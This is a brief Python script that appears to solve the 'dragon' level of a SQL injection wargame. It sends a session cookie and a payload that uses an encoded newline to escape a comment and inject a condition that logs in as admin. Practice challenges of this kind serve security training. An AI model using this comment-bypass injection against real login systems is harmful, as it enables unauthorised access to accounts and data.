import requests

url = 'https://los.rubiya.kr/chall/dragon_51996aa769df79afbf79eb4d66dbcef6.php'
cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
payload = f"?pw=%0A and 0 or id='admin"

r = requests.get(url + payload, cookies=cookie)
if 'DRAGON Clear!' in r.text:
    print('DRAGON Clear!')
